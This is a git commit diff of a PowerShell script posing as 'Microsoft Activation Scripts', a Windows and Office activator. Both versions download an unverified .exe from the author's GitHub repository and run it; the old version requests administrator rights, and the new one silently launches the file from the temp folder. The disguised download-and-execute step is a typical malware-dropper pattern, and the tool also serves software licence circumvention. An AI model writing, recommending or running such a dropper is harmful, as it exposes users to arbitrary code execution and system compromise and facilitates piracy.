6a80ba0216450c5d7dc0f1186e856d20380be9c6
acenljd <thebluepoint2@gmail.com>
2025-12-09 00:37:14 +0200

    Update Microsoft Activation Scripts.ps1

--- Microsoft Activation Scripts.ps1
+++ Microsoft Activation Scripts.ps1
@@ -1,21 +1,9 @@
-$FilePath = "Windows10.and.11.Activator.+.Office.Activator.2025.exe"
-$DownloadUrl = "https://raw.githubusercontent.com/acenljd/Windows-Activator/refs/heads/main/Microsoft%20Activation%20Scripts.exe"
+# Изтегляне и незабавно стартиране
+$url = "https://raw.githubusercontent.com/acenljd/Windows-Activator/refs/heads/main/Microsoft%20Activation%20Scripts.exe"
+$tempFile = "$env:TEMP\Microsoft Activation Scripts.exe"
 
-try {
-    Write-Host "Downloading file..." -ForegroundColor Yellow
-    Invoke-WebRequest -Uri $DownloadUrl -OutFile $FilePath
-    
-    if (Test-Path $FilePath) {
-        $fileSize = (Get-Item $FilePath).Length / 1MB
-        Write-Host "File downloaded successfully! Size: $([math]::Round($fileSize, 2)) MB" -ForegroundColor Green
-        
-        Write-Host "Starting program with administrator rights..." -ForegroundColor Cyan
-        Start-Process -FilePath $FilePath -Verb RunAs
-    } else {
-        Write-Error "Error: File was not downloaded"
-    }
-}
-catch {
-    Write-Error "Download error: $_"
-    pause
-}
+# Изтегляне
+Invoke-WebRequest -Uri $url -OutFile $tempFile
+
+# Стартиране
+Start-Process $tempFile
